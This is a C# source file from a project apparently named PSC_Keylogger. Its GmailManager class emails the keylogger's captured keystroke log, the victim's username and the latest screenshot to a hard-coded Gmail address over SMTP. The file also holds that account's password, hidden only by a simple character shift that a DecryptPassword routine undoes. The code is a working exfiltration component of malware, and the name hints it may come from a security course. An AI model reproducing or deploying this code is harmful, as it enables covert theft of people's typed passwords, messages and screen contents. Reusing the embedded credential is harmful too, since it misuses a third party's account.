using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace PSC_Keylogger
{
    public static class GmailManager
    {
        private const string FROM_EMAIL_ADDRESS = "protocoalesecuritate01@gmail.com";
        private const string FROM_EMAIL_PASSWORD = "surwrfrdohghvhfxulwdwhlqfrpxqlfdwll";
        private const string TO_EMAIL_ADDRESS = "protocoalesecuritate01@gmail.com";

        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
        private const bool INCLUDE_IMAGES_AS_ATTACHMENTS = true;

        public static void SendMail()
        {
            try
            {
                StreamReader input = new StreamReader(BaseKeylogger.ARCHIVE_FILE_NAME);
                string emailBody = input.ReadToEnd();
                input.Close();

                SmtpClient client = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, DecryptPassword()),
                    EnableSsl = true,
                };

                MailMessage message = new MailMessage
                {
                    From = new MailAddress(FROM_EMAIL_ADDRESS),
                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                    Body = emailBody,
                    IsBodyHtml = false,
                };

                if (INCLUDE_LOG_AS_ATTACHMENT)
                {
                    Attachment attachment = new Attachment(BaseKeylogger.ARCHIVE_FILE_NAME, System.Net.Mime.MediaTypeNames.Text.Plain);
                    message.Attachments.Add(attachment);
                }

                if (INCLUDE_IMAGES_AS_ATTACHMENTS)
                {
                    string[] files = Directory.GetFiles(BaseKeylogger.DIRECTORY_FILE_NAME);
                    string lastImageName = "";
                    foreach (string file in files)
                    {
                        if (file.EndsWith(".jpg"))
                        {
                            lastImageName = file;
                        }
                    }

                    if (lastImageName.Length > 0)
                    {
                        Attachment attachment = new Attachment(lastImageName);
                        message.Attachments.Add(attachment);
                    }
                }

                message.To.Add(TO_EMAIL_ADDRESS);

                client.Send(message);

                message.Dispose();
            }
            catch (Exception e)
            {
                Console.Out.WriteLine(e.Message);
            }
        }

        private static string DecryptPassword()
        {
            byte[] values = Encoding.ASCII.GetBytes(FROM_EMAIL_PASSWORD);
            byte[] newValues = new byte[values.Length];

            int index = 0;
            foreach(byte b in values)
            {
                int newValue = b - 3;
                newValues[index] = (byte)newValue;
                index += 1;
            }

            string actualPass = Encoding.ASCII.GetString(newValues);
            return actualPass;
        }
    }
}
